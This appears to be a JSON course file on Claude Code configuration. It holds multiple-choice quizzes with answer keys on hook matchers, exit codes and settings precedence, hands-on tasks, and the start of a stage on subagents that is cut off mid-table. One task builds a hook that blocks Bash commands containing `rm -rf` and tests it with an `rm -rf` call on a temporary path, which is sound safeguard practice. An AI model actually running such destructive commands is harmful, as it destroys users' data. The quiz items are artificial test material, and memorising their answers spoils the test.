    "prompt": "You configure a `PreToolUse` hook with the matcher value `bash`. The hook never fires even though Bash is frequently called. What is the most likely explanation?",
    "options": [
     "Matchers on `PreToolUse` only accept regex patterns, not plain strings.",
     "Matchers are case-sensitive: the tool name is `Bash` (capital B), so `bash` silently never matches.",
     "Hooks on `PreToolUse` require the `if` filter to be set before the matcher is evaluated.",
     "`PreToolUse` hooks only fire when the tool call is blocked, not when it is allowed."
    ],
    "correct": 1,
    "sectionIndices": [
     10
    ],
    "explanation": "Matchers are case-sensitive. The tool name is `Bash` with a capital B; the matcher `bash` silently never fires. This is explicitly called out as a pitfall in the content."
   },
   {
    "prompt": "A hook handler exits with code `1` while checking a pre-commit file. You expected this to block the operation and show an error message to Claude. What actually happens?",
    "options": [
     "Exit code `1` blocks execution and sends stderr to Claude as feedback, same as exit code `2`.",
     "Exit code `1` is non-blocking — only exit code `2` blocks; any other non-zero code is treated as a non-fatal error.",
     "Exit code `1` blocks execution but stdout is discarded; only exit code `2` includes stderr feedback.",
     "Exit code `1` causes Claude Code to terminate the entire session with a fatal error."
    ],
    "correct": 1,
    "sectionIndices": [
     10
    ],
    "explanation": "Only exit code `2` blocks. Any other non-zero exit code (including `1`) is non-blocking — execution continues. Only exit code `2` causes stderr to be fed back to Claude as feedback."
   },
   {
    "prompt": "Your team sets up an `http` hook handler that returns an HTTP 403 status to block a tool call. The tool call goes through anyway. What is the issue?",
    "options": [
     "HTTP hooks cannot block tool calls; only `command` type hooks can block.",
     "HTTP hooks must return a 2xx status code with a body containing `hookSpecificOutput` to block — HTTP status alone cannot block.",
     "The hook is firing asynchronously because `async: true` is set by default for `http` hooks.",
     "Blocking via HTTP requires exit code `2` to be returned in a special header `X-Hook-Exit`."
    ],
    "correct": 1,
    "sectionIndices": [
     10
    ],
    "explanation": "HTTP handler hooks can only block via a 2xx response body containing `hookSpecificOutput`. HTTP status codes alone (like 403) cannot block execution."
   },
   {
    "prompt": "You add an `if` filter to a `UserPromptSubmit` hook, hoping to limit it to prompts containing the word 'deploy'. The hook stops firing entirely. What explains this?",
    "options": [
     "`UserPromptSubmit` requires the `if` filter to use a regex, not a plain string.",
     "Adding an `if` filter to a non-tool event (like `UserPromptSubmit`) prevents the hook from running at all.",
     "The `if` filter on `UserPromptSubmit` only applies to the first prompt per session and then disables itself.",
     "The `if` filter is not evaluated until after the hook exits; a hook that exits `0` before the filter runs causes the issue."
    ],
    "correct": 1,
    "sectionIndices": [
     10
    ],
    "explanation": "The `if` filter is only valid for tool-name events (`PreToolUse`, `PostToolUse`, etc.). Adding it to a non-tool event like `UserPromptSubmit` prevents the hook from running at all."
   },
   {
    "prompt": "A teammate runs `/model claude-opus-4-5` with the intent of using that model only for the current session, then forgets to switch back. In a new session the next day, which model is active?",
    "options": [
     "The session's model selection does not persist; Claude Code always resets to the default on a new session.",
     "The model selected with `/model` is saved as the default for new sessions, so `claude-opus-4-5` will be active the next day.",
     "The model reverts to the team's configured default in `.claude/settings.json` because `/model` only affects the current project.",
     "The teammate must run `/model --save` for the selection to persist; without the flag, it's session-only."
    ],
    "correct": 1,
    "sectionIndices": [
     4
    ],
    "explanation": "`/model <model>` switches the model AND saves it as the default for new sessions. To switch for the current session only without saving, the user must press `s` in the model picker."
   },
   {
    "prompt": "You want a hook to run a slow background integrity check after every file edit, and have the check's findings injected as a system reminder before Claude's NEXT response (not interrupting the current one). Which hook configuration achieves this?",
    "options": [
     "Set `async: true` on a `PostToolUse` hook matching `Edit`.",
     "Set `asyncRewake: true` on a `PostToolUse` hook matching `Edit`, and exit with code `2` when findings are ready.",
     "Set `async: true` on the hook and exit with code `0`; stdout is automatically injected as a reminder.",
     "Use `type: agent` with `async: true` — only agent-type hooks support rewake behavior."
    ],
    "correct": 1,
    "sectionIndices": [
     10
    ],
    "explanation": "`asyncRewake: true` runs the hook in the background and wakes Claude on exit `2`, with stderr/stdout shown as a system reminder on the next model request. This is the mechanism for background monitors that need to report back."
   },
   {
    "prompt": "After editing a skill file on disk, a developer notices Claude Code isn't picking up the changes. They try `/reload-plugins` but the changes still don't apply. What should they run instead?",
    "options": [
     "`/plugin disable` followed by `/plugin enable` to force a full plugin reload.",
     "`/reload-skills` — skill/command directories require a separate reload command, available in v2.1.152+.",
     "Restart Claude Code entirely — neither `/reload-plugins` nor `/reload-skills` picks up skill content changes.",
     "`/doctor` to diagnose why the skill is not loading, then `/reload-plugins --force`."
    ],
    "correct": 1,
    "sectionIndices": [
     8
    ],
    "explanation": "`/reload-skills` (v2.1.152+) re-scans skill/command directories so on-disk changes apply without restart. `/reload-plugins` handles plugins, not standalone skill files."
   },
   {
    "prompt": "Your team uses `/add-dir /path/to/shared-lib` to give Claude access to a shared library directory. A developer reports that the shared library's `.claude/settings.json` hooks are not running. What is the correct explanation?",
    "options": [
     "`/add-dir` loads the directory's `.claude/settings.json` config, but hooks require explicit opt-in via `hooksEnabled: true`.",
     "`/add-dir` does NOT load the added directory's `.claude/` config (settings, hooks, commands) — only `.claude/skills/` from that directory is loaded.",
     "`/add-dir` only grants file-read access; to load config from the directory, use `/cd` instead.",
     "Hooks from added directories are loaded but run in a sandboxed mode without blocking capability."
    ],
    "correct": 1,
    "sectionIndices": [
     7
    ],
    "explanation": "`/add-dir` grants file access to a directory but does NOT load that directory's `.claude/` config, EXCEPT `.claude/skills/` which IS loaded. Commands, hooks, and output-styles from added dirs are not loaded."
   },
   {
    "prompt": "A hook is configured to match MCP tool calls from any server that perform write operations using a regex pattern. Which matcher string correctly matches tools like `mcp__github__write_file` and `mcp__filesystem__write_dir`?",
    "options": [
     "`mcp__*__write*` — glob-style wildcards work in matchers for MCP tools.",
     "`mcp__.*__write.*` — any string containing a non-alphanumeric character other than `_` is interpreted as a JS regex.",
     "`mcp|write` — pipe-separated values match any of the listed substrings anywhere in the tool name.",
     "`mcp__github__write_file|mcp__filesystem__write_dir` — exact pipe-separated names are the only safe way to match multiple MCP tools."
    ],
    "correct": 1,
    "sectionIndices": [
     10
    ],
    "explanation": "Matcher syntax: if the value contains any character other than letters, digits, `_`, or `|`, it is treated as a JS regex. `mcp__.*__write.*` uses `.` (a non-`_`/non-digit char), making it a regex that matches any MCP server's write tools."
   },
   {
    "prompt": "You run `/compact` mid-session to free context. Later in the SAME conversation you realize you need a detail from earlier. What is the correct characterization of what `/compact` does to prior conversation content?",
    "options": [
     "`/compact` ends the current conversation and starts a fresh one, permanently discarding prior content.",
     "`/compact` summarizes the conversation to free context while continuing the same conversation — prior details not in the summary are no longer accessible in this session.",
     "`/compact` archives the full conversation to disk and loads only the summary, so you can restore it later with `/resume`.",
     "`/compact` frees context by offloading turn text to a sidecar file that Claude can re-read on demand."
    ],
    "correct": 1,
    "sectionIndices": [
     3
    ],
    "explanation": "`/compact` summarizes the conversation to free context while continuing the same conversation. Details not captured in the summary are gone for the rest of this session. `/clear` (not `/compact`) is what starts a fresh session stored in `/resume`."
   },
   {
    "prompt": "A hook handler outputs plain text (non-JSON) to stdout and exits with code `0` on a `PostToolUse` event. What happens with that stdout text?",
    "options": [
     "The plain text is added as context to Claude's next message on any event type.",
     "Plain (non-JSON) stdout is added as context ONLY for `SessionStart`, `UserPromptSubmit`, and `UserPromptExpansion`; on `PostToolUse` it is ignored.",
     "Plain text stdout on exit `0` is always displayed to the user in the terminal but not passed to Claude.",
     "The hook framework automatically JSON-wraps plain stdout before passing it to Claude, so it always becomes context."
    ],
    "correct": 1,
    "sectionIndices": [
     10
    ],
    "explanation": "On exit code `0`, plain (non-JSON) stdout is added as context ONLY for `SessionStart`, `UserPromptSubmit`, and `UserPromptExpansion`. For all other events including `PostToolUse`, non-JSON stdout is ignored."
   }
  ],
  "tasks": [
   {
    "id": "stage3-task-precedence-audit",
    "afterSectionIdx": 1,
    "title": "Map your live config precedence stack",
    "instructions": "Inspect each layer of the settings stack and verify which layer is actually controlling your session.\n\n```bash\n# 1. View your user-level config\ncat ~/.claude/settings.json\n\n# 2. View the project-level config (run from your project root)\ncat .claude/settings.json 2>/dev/null || echo '(no project settings file)'\n\n# 3. View the local (gitignored) overrides\ncat .claude/settings.local.json 2>/dev/null || echo '(no local settings file)'\n```\n\nThen open Claude Code and run:\n```\n/hooks\n```\nNote the **Source** column next to each hook — it shows `User`, `Project`, `Local`, `Plugin`, or `Session` so you can see exactly which layer each hook comes from.\n\nFinally, add a harmless test permission to `.claude/settings.local.json` to confirm local overrides work:\n```json\n{\n  \"permissions\": {\n    \"allow\": [\"Bash(echo *)\"],\n    \"deny\": []\n  }\n}\n```\nRun `/hooks` and `/permissions` again to confirm the new rule appears with source `Local`.",
    "doneWhen": "You can see at least two distinct Source labels in the `/hooks` or `/permissions` output (e.g., `User` and `Project`), confirming the layered precedence stack is active."
   },
   {
    "id": "stage3-task-write-blocking-hook",
    "afterSectionIdx": 10,
    "title": "Write a blocking PreToolUse hook with correct exit code",
    "instructions": "Add a `PreToolUse` hook that blocks any `Bash` call containing `rm -rf` and returns feedback to Claude.\n\n1. Open (or create) `.claude/settings.json` in your project root and add the following hook:\n```json\n{\n  \"hooks\": {\n    \"PreToolUse\": [\n      {\n        \"matcher\": \"Bash\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"python3 -c \\\"import sys, json; data=json.load(sys.stdin); cmd=data.get('tool_input',{}).get('command',''); sys.stderr.write('Blocked: rm -rf is not allowed\\\\n') or sys.exit(2) if 'rm -rf' in cmd else sys.exit(0)\\\"\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n2. In Claude Code, run:\n```\n/hooks\n```\nConfirm the new `PreToolUse` hook appears with source `Project`.\n\n3. Ask Claude to run a safe test:\n> Please run: `echo hello`\nIt should succeed (exit 0).\n\n4. Ask Claude:\n> Please run: `rm -rf /tmp/test-nonexistent`\nThe hook should block it and Claude should see the stderr message `Blocked: rm -rf is not allowed`.",
    "doneWhen": "Claude reports that the `rm -rf` Bash call was blocked with the feedback message from stderr, while `echo hello` ran without issue."
   },
   {
    "id": "stage3-task-reload-skills",
    "afterSectionIdx": 8,
    "title": "Create a custom skill and reload it live",
    "instructions": "Add a custom skill file and reload it without restarting Claude Code.\n\n1. Create the skills directory if it doesn't exist:\n```bash\nmkdir -p .claude/skills\n```\n\n2. Write a minimal skill file at `.claude/skills/git-status-helper.md`:\n```markdown\n---\nname: git-status-helper\ndescription: Show a formatted git status summary. Use when the user asks for project status or a clean git overview.\n---\n\nRun `git status --short --branch` and summarize the output: list the branch name, number of modified files, and number of untracked files in one sentence.\n```\n\n3. In Claude Code, run:\n```\n/skills\n```\nNote that the new skill does NOT appear yet (it was added after session start).\n\n4. Run:\n```\n/reload-skills\n```\n\n5. Run `/skills` again and confirm `git-status-helper` now appears in the list.",
    "doneWhen": "After running `/reload-skills`, the `git-status-helper` skill appears in the `/skills` list without having restarted Claude Code."
   }
  ],
  "visualizations": [
   {
    "id": "stage-3-v",
    "kind": "comparison-table",
    "title": "Skills, hooks & commands",
    "textualSummary": "Key concepts of Skills, hooks & commands: configuration scope and precedence, shared vs. personal config placement, hooks on lifecycle events.",
    "columns": [
     "Concept",
     "In this stage"
    ],
    "rows": [
     {
      "label": "configuration scope and precedence",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "shared vs. personal config placement",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "hooks on lifecycle events",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "hook exit-code blocking semantics",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     }
    ]
   }
  ],
  "confusions": [
   {
    "misconception": "Skipping Skills, hooks & commands.",
    "correction": "Each stage is load-bearing for the setup."
   },
   {
    "misconception": "These concepts are interchangeable.",
    "correction": "Each has a distinct role; see the definitions."
   }
  ],
  "quiz": [
   {
    "id": "stage-3-q1",
    "type": "multiple-choice",
    "prompt": "Your team's security policy requires that every `Bash` tool call be logged to an audit service via HTTP POST. You configure an `http` hook on `PreToolUse` and set the audit service to return HTTP 403 when it wants to block a command. During testing you notice that commands still execute even when the service returns 403. What is the most likely cause?",
    "options": [
     "The `http` handler ignores HTTP status codes for blocking — it can only block via a 2xx response body that includes `hookSpecificOutput`.",
     "The `PreToolUse` event does not support blocking; only `PostToolUse` hooks can prevent execution.",
     "HTTP hooks are always `async:true` by default, so they cannot block execution.",
     "The hook matcher must include the full tool path including MCP prefix for Bash calls."
    ],
    "correct": 0,
    "explanation": "The content states explicitly: 'block via 2xx body with `hookSpecificOutput` (HTTP status alone can't block).' A 403 is a non-2xx status, but even a 200 status without `hookSpecificOutput` in the body would not block. Option B is wrong — PreToolUse does support blocking. Option C is wrong — async:true is not the default and must be set explicitly. Option D is wrong — Bash is a built-in tool, not an MCP tool, and needs no prefix."
   },
   {
    "id": "stage-3-q2",
    "type": "multiple-choice",
    "prompt": "A teammate adds a `PreToolUse` hook with `if: 'Bash(git *)'` to skip spawning the hook process for non-git bash calls. She then mentions she also added the same `if` filter to a `ConfigChange` hook to reduce noise. The next day, the `ConfigChange` hook never fires at all. What does the content say explains this behavior?",
    "options": [
     "Adding `if` to a non-tool event prevents the hook from running at all.",
     "The `ConfigChange` event requires a `matcher` field instead of an `if` field to filter.",
     "The `if` filter fails open on non-tool events, firing the hook for every config change regardless of the filter value.",
     "`ConfigChange` hooks only accept `mcp_tool` or `http` handler types, not `command` handlers with `if` filters."
    ],
    "correct": 0,
    "explanation": "The content states: 'Adding `if` to a non-tool event prevents the hook from running at all.' The `if` filter is defined only for tool events (PreToolUse, PostToolUse, etc.) and using it on non-tool events silently disables the hook entirely. Option B is wrong — ConfigChange uses a matcher, but that is separate from the `if` issue. Option C inverts the real behavior (fails open = runs anyway on unparseable commands, not fires always). Option D is unsupported by the content."
   },
   {
    "id": "stage-3-q3",
    "type": "multiple-choice",
    "prompt": "You write a `PostToolUse` hook script that outputs a detailed JSON summary to stdout. You expect Claude to receive this summary as context after every tool call so it can adjust its next action. After deployment, Claude never mentions the information in the JSON. What does the configuration spec say explains this?",
    "options": [
     "Plain stdout is added as context only for `SessionStart`, `UserPromptSubmit`, and `UserPromptExpansion`; for all other events including `PostToolUse`, non-JSON-decision stdout is ignored.",
     "Context injection from hooks requires setting `async:true` so the output is buffered and delivered to the next model request.",
     "The hook output must be written to stderr instead of stdout for Claude to receive it as context.",
     "`PostToolUse` hooks cannot inject context; they can only block (exit 2) or succeed silently (exit 0)."
    ],
    "correct": 0,
    "explanation": "The content states: 'Plain (non-JSON) stdout added as context ONLY for `SessionStart`/`UserPromptSubmit`/`UserPromptExpansion`; ignored elsewhere.' Since PostToolUse is not in that list, stdout is ignored. Option B is wrong — async:true means fire-and-forget, not buffered context delivery. Option C is wrong — stderr is fed back as feedback only on exit 2 (block), not as general context. Option D overstates the restriction; PostToolUse can return JSON decisions, it just can't inject plain stdout context."
   },
   {
    "id": "stage-3-q4",
    "type": "multiple-choice",
    "prompt": "Your organization's platform team wants to enforce a company-wide rule that developers cannot disable a specific safety hook. Individual developers have `~/.claude/settings.json` and project `.claude/settings.json` files. Where must the platform team place this hook so that developer settings cannot override it?",
    "options": [
     "In managed policy settings, which sit at the highest precedence and cannot be overridden by user or project settings.",
     "In `.claude/settings.json` committed to every project repository, since project settings override user settings.",
     "In `~/.claude/settings.json` on each developer's machine, since user settings are the base layer.",
     "In a plugin's `hooks/hooks.json`, since plugin hooks load before any settings file."
    ],
    "correct": 0,
    "explanation": "The content's precedence order is: user → project → local → managed policy (highest, admin-controlled). It explicitly states managed policy settings are 'highest, admin-controlled' and uses them for 'Guardrails users cannot bypass.' Placing the rule in project .claude/settings.json (option B) can be overridden by local settings. User settings (option C) are the base layer, overridden by everything else. Plugin hooks (option D) have no stated precedence advantage over managed policy."
   },
   {
    "id": "stage-3-q5",
    "type": "multiple-choice",
    "prompt": "You use `/add-dir /shared/libs` to give your session access to a shared library directory. The shared library repo has `.claude/settings.json` with hooks and a skill in `.claude/skills/check-types.md`. After adding the directory, you notice the hooks from that repo never fire, but the `check-types` skill appears in your session. What does the content say explains this split behavior?",
    "options": [
     "`/add-dir` does not load the added dir's `.claude/` config (including hooks and settings), but it DOES load `.claude/skills/` from that directory.",
     "`/add-dir` loads the full `.claude/` config including hooks, but skills must be explicitly enabled with `/reload-skills` after adding.",
     "`/add-dir` loads everything from `.claude/` except hooks, because hooks require the directory to be the active working directory.",
     "Both hooks and skills are loaded by `/add-dir`; the hooks are likely misconfigured or use an event name with incorrect casing."
    ],
    "correct": 0,
    "explanation": "The content states: '/add-dir <path> — add a working directory for file access. Does NOT load that dir's `.claude/` config, EXCEPT `.claude/skills/` (which IS loaded).' This directly explains why the hook from settings.json does not fire (config not loaded) but the skill does appear (skills directory is the exception). Options B, C, and D all incorrectly claim some or all of the .claude/ config is loaded."
   },
   {
    "id": "stage-3-q6",
    "type": "multiple-choice",
    "prompt": "A teammate writes a `FileChanged` hook and sets the matcher to `\\.ts$` expecting it to fire only for TypeScript files. After committing, she reports the hook never fires for `.ts` files but occasionally fires for files she did not expect. What does the content say about how `FileChanged` matchers work?",
    "options": [
     "`FileChanged` matcher values are treated as literal filenames, not regex — so `\\.ts$` would only match a file literally named `\\.ts$`.",
     "`FileChanged` matchers use JS regex but require the full path including directory, so `\\.ts$` fails because it doesn't include the directory prefix.",
     "`FileChanged` uses the same matcher syntax as tool-name events, which interprets `\\.ts$` as a pipe-separated list and causes unexpected matches.",
     "`FileChanged` matchers are case-insensitive, so `\\.ts$` fires for `.TS` files but silently skips lowercase `.ts` filenames."
    ],
    "correct": 0,
    "explanation": "The content states explicitly: 'FileChanged — matcher values split into literal filenames, not regex.' This means `.ts$` would be treated as an exact literal filename match, not a regex. The hook either never fires (no file is literally named `\\.ts$`) or if the matcher is processed differently, the behavior is not regex-based. Options B, C, and D all involve regex interpretation, which is the misconception the question targets."
   },
   {
    "id": "stage-3-q7",
    "type": "multiple-choice",
    "prompt": "You configure a background monitoring hook with `asyncRewake:true` on a `Stop` event. After a session ends, the monitor script runs and discovers a test failure. What should happen next according to the content?",
    "options": [
     "The hook runs in the background and wakes Claude on exit 2, with stderr and stdout shown as a system reminder on the next model request.",
     "Because the `Stop` event has already fired, `asyncRewake:true` has no effect — the session is closed and cannot be re-entered.",
     "The hook wakes Claude immediately (synchronously interrupting the stop) and Claude resumes the session to fix the failure.",
     "`asyncRewake:true` causes the hook's stdout to be injected as context at the start of the NEXT new session."
    ],
    "correct": 0,
    "explanation": "The content states: '`asyncRewake:true` = runs in background and wakes Claude on exit 2 (stderr/stdout shown as a system reminder on the next model request) — for background monitors that report back.' This means the hook runs async, and if it exits with code 2, Claude is woken and sees the output as a system reminder. Option B is wrong — asyncRewake is specifically designed to work across the stop boundary. Option C is wrong — it wakes on exit 2, not synchronously. Option D is wrong — it wakes Claude on the next request, but via a system reminder, not context injection at session start."
   },
   {
    "id": "stage-3-q8",
    "type": "multi-select",
    "prompt": "Your team is setting up a shared repository and needs to configure Claude Code for all contributors. Select ALL statements that correctly describe where configuration should be placed according to the content.",
    "options": [
     "Team-standard hooks and permissions should be committed to `.claude/settings.json` so they are shared with all contributors.",
     "Personal or experimental hook overrides that should not impose on teammates belong in `~/.claude/settings.json` or `.claude/settings.local.json`.",
     "`.claude/settings.local.json` is committable to the repository and serves as the team's override layer above project settings.",
     "Managed policy settings are the correct place for org-wide guardrails that no individual contributor can bypass.",
     "Plugin `hooks/hooks.json` is the primary recommended location for team-standard hooks because it loads before project settings."
    ],
    "correct": [
     0,
     1,
     3
    ],
    "explanation": "Options A and B are directly stated: 'commit team-standard hooks/permissions to `.claude/settings.json`; keep personal/experimental ones in `~/.claude/settings.json` or gitignored `.claude/settings.local.json` so they don't impose on the team.' Option D is correct: managed policy settings are 'admin-controlled' for 'Guardrails users cannot bypass.' Option C is wrong — `.claude/settings.local.json` is gitignored, not committable. Option E is wrong — the content does not rank plugin hooks as the primary recommendation for team-standard hooks; project settings.json serves that role."
   },
   {
    "id": "stage-3-q9",
    "type": "multi-select",
    "prompt": "Which of the following are TRUE about hook matcher syntax according to the content? Select all that apply.",
    "options": [
     "A matcher value containing only letters, digits, underscores, and pipe characters is treated as an exact match or pipe-separated list.",
     "Matcher values are case-sensitive — a hook intended for `PreToolUse` will never fire if written as `preToolUse`.",
     "An MCP tool from a server named `github` and tool named `create_issue` would be matched by the pattern `mcp__github__.*`.",
     "A wildcard matcher (`\"*\"` or omitted) matches all tool names for tool-name events.",
     "The `if` filter uses the same regex syntax as the `matcher` field and can be used on any event type to reduce overhead."
    ],
    "correct": [
     0,
     1,
     2,
     3
    ],
    "explanation": "Option A: The content states 'value with only letters/digits/`_`/`|` = exact or pipe-separated list.' Option B: 'Event names are case-sensitive' and 'Matchers are case-sensitive (mismatched case silently never fires).' Option C: MCP tools are named `mcp__<server>__<tool>` and the content shows the example `mcp__github__.*` as a valid matcher. Option D: The content states '\"*\"/\"\"/omitted = all.' Option E is FALSE — the `if` filter uses permission-rule syntax (`Bash(git *)`, `Edit(*.ts)`), not the same regex syntax as matchers, and crucially 'Adding `if` to a non-tool event prevents the hook from running at all' — so it cannot be used on any event type."
   },
   {
    "id": "stage-3-q10",
    "type": "multiple-choice",
    "prompt": "A hook script intended to block a disallowed file edit exits with code 1 and prints an error message to stderr. A teammate expected this to prevent the file write. What actually happens?",
    "options": [
     "Exit code 1 is non-blocking — only exit code 2 blocks. The file write proceeds and the stderr message is ignored for blocking purposes.",
     "Exit code 1 and exit code 2 both block execution; the difference is that exit 1 is silent while exit 2 feeds stderr back to Claude.",
     "Exit code 1 blocks execution and stderr is fed back to Claude as feedback, the same behavior as exit code 2.",
     "The hook's effect depends on the handler type — for `command` handlers, exit 1 blocks, but for `http` handlers only the HTTP status matters."
    ],
    "correct": 0,
    "explanation": "The content's exit code table specifies: exit 2 = Block (stdout/JSON ignored; stderr fed back to Claude as feedback); 'any other (incl. `1`)' = Non-blocking. So exit 1 does NOT block — only exit 2 does. The teammate's script would need to exit with code 2 for the block to take effect. Options B and C both wrongly treat exit 1 as blocking. Option D introduces a false handler-type dependency that the content does not support."
   },
   {
    "id": "stage-3-q11",
    "type": "multiple-choice",
    "prompt": "Your team wants a pre-commit style check: before Claude stops working, run the test suite and if tests fail, have Claude fix the failures rather than stopping. Which hook handler type and event are most appropriate according to the content?",
    "options": [
     "An `agent` handler on the `Stop` event, because verification must inspect actual files (e.g. run tests) and the agent can take follow-up actions.",
     "A `prompt` handler on the `Stop` event, because the LLM can evaluate test output and decide whether to block.",
     "A `command` handler on the `PostToolBatch` event, because commands run after each batch of tool calls and can block via exit 2.",
     "An `http` handler on the `Stop` event posting to a CI service, since external CI systems are the correct place to run tests."
    ],
    "correct": 0,
    "explanation": "The content states the `agent` handler type is for 'Experimental multi-turn subagent with tool access (up to 50 tool-use turns). Use only when verification must inspect actual files (e.g. run tests before a Stop).' The `Stop` event fires when Claude finishes, and the agent handler is explicitly called out for this exact use case. Option B (`prompt`) is wrong — the content says 'Use when hook input alone suffices,' but running a test suite requires file inspection. Option C is wrong — PostToolBatch does not fire on Stop and cannot replace the Stop event for pre-stop gating. Option D's http approach cannot run local tests directly."
   },
   {
    "id": "stage-3-q12",
    "type": "multiple-choice",
    "prompt": "A developer types `/code-review high --fix src/api.ts` in the middle of a message that also includes 'and also check the docs folder'. What does the content say about how slash commands are parsed?",
    "options": [
     "A slash command is recognized only at the start of a message; trailing text after the command is passed as arguments. The phrase 'and also check the docs folder' would be treated as additional arguments to `/code-review`, not as a separate instruction.",
     "A slash command can appear anywhere in a message; the parser scans for `/` and treats the next word as the command, ignoring surrounding text.",
     "Trailing text after a slash command causes the command to be unrecognized; the entire message is treated as a plain conversation turn.",
     "The slash command `/code-review` accepts only flags and a target file, so 'and also check the docs folder' would cause a parse error and the command would not run."
    ],
    "correct": 0,
    "explanation": "The content states: 'A slash command is recognized only at the start of a message; trailing text is passed as arguments.' This means 'and also check the docs folder' becomes part of the argument string, not a separate instruction or a parse error. Option B inverts the rule — it must be at the start. Option C is wrong — trailing text does not prevent recognition; it becomes arguments. Option D incorrectly describes command-specific argument parsing that the content does not specify."
   },
   {
    "id": "stage-3-q13",
    "type": "multiple-choice",
    "prompt": "You run `/effort ultracode` at the start of a session for a complex refactor. After the session is done, you open a new session for a quick one-line fix and notice it is still running at `ultracode` effort level. Why might this be happening — and what does the content say about persistence of effort levels?",
    "options": [
     "This would NOT happen per the content — `max` and `ultracode` are session-only and do not persist. The new session should revert to the model default. Another explanation is needed.",
     "`ultracode` persists across sessions because `/effort` always saves the level as the new default, the same way `/model` does.",
     "Effort levels persist until explicitly reset with `/effort auto`, which explains why the new session inherits `ultracode`.",
     "The behavior depends on the plan tier; on Team/Enterprise plans effort levels are saved per-project and persist across sessions."
    ],
    "correct": 0,
    "explanation": "The content states: '`max`/`ultracode` are session-only (don't persist).' This directly contradicts the scenario — ultracode should NOT carry over to a new session. The correct answer identifies this discrepancy and directs the user to find another explanation. Option B is wrong — the content contrasts /model (which 'saves as default for new sessions') with effort levels that don't persist. Option C conflates /effort auto (which resets to model default) with the persistence question. Option D invents a plan-tier dependency the content does not mention."
   }
  ],
  "masteryCheckpoint": "You can explain the concepts of Skills, hooks & commands."
 },
 {
  "id": "stage-4",
  "stage": 4,
  "title": "Subagents & agent teams",
  "summary": "Subagents & agent teams: Choosing a multi-context approach, Subagent, Definition scope and precedence.",
  "prerequisites": [
   "stage-3"
  ],
  "objectives": [
   "Understand the concepts in Subagents & agent teams."
  ],
  "definitions": [
   {
    "term": "Choosing a multi-context approach",
    "short": "Claude Code offers four ways to run work in more than one context, picked by who coordinates the work and whether the workers need to talk to each other."
   },
   {
    "term": "Subagent",
    "short": "A worker defined in a Markdown file (YAML frontmatter plus body-as-system-prompt) that runs in a fresh isolated context and returns only a summary to the conversation that spawned it."
   },
   {
    "term": "Definition scope and precedence",
    "short": "Subagent definitions resolve across ranked scopes (managed, CLI flag, project, user, plugin), and on a name collision the higher-priority or closest-to-cwd definition wins."
   },
   {
    "term": "Subagent frontmatter configuration",
    "short": "Frontmatter fields tune each subagent's routing, tools, model, permissions, memory, and isolation so it does one focused job with the minimum capability needed."
   },
   {
    "term": "Tool and context scoping for workers",
    "short": "Limiting a worker to the minimum tools, inlining its MCP servers, and using hooks for fine-grained gating keeps capability tight and keeps tool descriptions out of the main conversation's context."
   },
   {
    "term": "Fork vs fresh subagent",
    "short": "A fork inherits the entire current conversation (and reuses its prompt cache) for a side task, whereas a normal subagent starts from a fresh isolated context."
   }
  ],
  "sections": [
   {
    "heading": "The Four Multi-Context Modes: Choosing Before You Build",
    "body": "Before creating any subagent or team, you need to pick the right parallelism model. Claude Code offers four distinct ways to run work in more than one context, and they are not interchangeable — they differ in who coordinates, whether workers can talk to each other, and what the token and latency costs are.\n\n| Mode | Who coordinates | Worker-to-worker comms | Context inheritance | Token cost vs single session |\n|---|---|---|---|---|\n| **Subagent** | Lead agent delegates; result returns to main conversation | None — each reports to lead only | Fresh isolated context | Low — only summary reaches main window |\n| **Fork (`/fork`)** | Main conversation; fork runs a side task | None | Full parent conversation | Low on first request (shared prompt cache); separate cache after |\n| **Agent teams** | Lead + shared task list; teammates self-coordinate | Direct peer-to-peer messaging | Project context (CLAUDE.md, MCP, skills) — NOT lead's history | High — every teammate is a full independent Claude instance |\n| **Manual worktrees** | You manually coordinate multiple `claude` terminals | Out-of-band (shared files, git) | Fresh session per terminal | Scales with number of sessions |\n\n### The decision tree\n\n**Single context is usually right.** Reach for multi-context only when you can answer yes to at least one of:\n- The intermediate output (search results, log files, fetched docs) would flood the main context with content you will not reference again.\n- You have genuinely independent subtasks that can run in parallel with no inter-task dependencies.\n- Workers need to actively debate, challenge each other's conclusions, or hand off intermediate results peer-to-peer.\n\n**Subagent** is the default multi-context primitive. It is simple, cheap, and integrates with version control via `.claude/agents/`.\n\n**Fork** is the right tool when a subagent would need so much background that re-explaining the situation is expensive — the fork already knows everything because it inherits the parent conversation.\n\n**Agent teams** are justified only when teammates genuinely need to communicate with each other. The token cost scales linearly: every teammate is a full independent Claude instance with its own context window.\n\n**Manual worktrees** remain useful when you want full control over parallelism and agent teams' experimental limitations are unacceptable."
   },
   {
    "heading": "What a Subagent Actually Is",
    "body": "A subagent is a worker defined in a Markdown file with YAML frontmatter, running in a fresh isolated context window. It receives a delegation prompt from the lead, executes tool calls within its own window, and returns only a summary to the spawning conversation. The intermediate work — every file read, every search result, every log line — stays in the subagent's window and never enters the main conversation's context.\n\n### What a subagent does and does not inherit\n\nA non-fork subagent starts with:\n- Its own system prompt (the agent file's markdown body plus environment details that Claude Code appends), **not** the full Claude Code system prompt\n- The task message Claude composes at delegation time\n- All CLAUDE.md files in the memory hierarchy (managed, user, project, local)\n- A git status snapshot taken at the start of the parent session\n- Full content of any skills listed in its `skills:` frontmatter field\n\nA subagent does **not** receive:\n- The parent's conversation history\n- Files the parent has already read (it starts from zero knowledge of the codebase)\n- The parent's model selection (it resolves its own model per the resolution order in the next section)\n\nThis matters operationally. A subagent that needs to know \"we already tried approach X\" must be told so explicitly in the delegation prompt. Do not assume conversational context carries through.\n\n### Built-in subagents\n\nClaude Code ships several always-available subagents. **Explore** and **Plan** are the only ones that skip CLAUDE.md files and git status — they are optimized for fast, cheap context gathering:\n\n| Name | Model | Tools | Skips CLAUDE.md / git status? |\n|---|---|---|---|\n| Explore | Haiku | Read-only | Yes |\n| Plan | Inherits from main conversation | Read-only | Yes |\n| General-purpose | Inherits from main conversation | All tools | No |\n| statusline-setup | Sonnet | — | No |\n| claude-code-guide | Haiku | — | 